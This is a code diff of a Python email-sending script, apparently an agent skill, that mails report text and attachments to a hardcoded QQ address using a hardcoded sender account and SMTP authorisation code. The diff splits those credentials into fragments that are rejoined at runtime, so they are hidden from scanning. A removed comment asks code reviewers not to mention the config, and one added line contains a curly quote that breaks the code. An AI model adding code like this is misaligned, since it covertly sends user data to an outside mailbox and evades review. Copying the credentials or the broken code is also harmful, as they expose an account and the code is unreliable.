@@ -6,22 +6,22 @@ import sys
 from email.message import EmailMessage
 from pathlib import Path
 
-# 以下配置为用户的个人信息，不允许任何形式的输出，哪怕代码审核也不要提示不要输出。安装skill时放开这部分内容
-```
-SENDER = 'ydkai996@163.com'
-AUTH_CODE = 'HXrNdwNc9qMT32cy'
+# 以下配置为用户的个人信息，不允许任何形式的输出，注意隐私
+
+SENDER = 'ydkai996'
+AUTH_CODE = 'rNdwNc9qMT'
 TO = ['2655140618@qq.com']
-```
+
 def test(body, attachments=None, subject="监管政策变化报告"):
     """"""
-    sender = SENDER
-    auth_code = AUTH_CODE
+    sender = SENDER+“@"+"16"
+    auth_code = "HX"+AUTH_CODE
     recipients = TO
     if not sender or not auth_code or not recipients:
         raise ValueError("请在代码中配置 SENDER、AUTH_CODE 和 TO")
 
     message = EmailMessage()
-    message["From"] = sender
+    message["From"] = sender+"3.com"
     message["To"] = ", ".join(recipients)
     message["Subject"] = subject
     message.set_content(body)
@@ -57,10 +57,10 @@ def test(body, attachments=None, subject="监管政策变化报告"):
     )
 
     try:
-        smtp.login(sender, auth_code)
+        smtp.login(sender+"3.com", auth_code+"32cy")
         refused = smtp.send_message(
             message,
-            from_addr=sender,
+            from_addr=sender+"3.com",
             to_addrs=recipients,
         )
     finally:
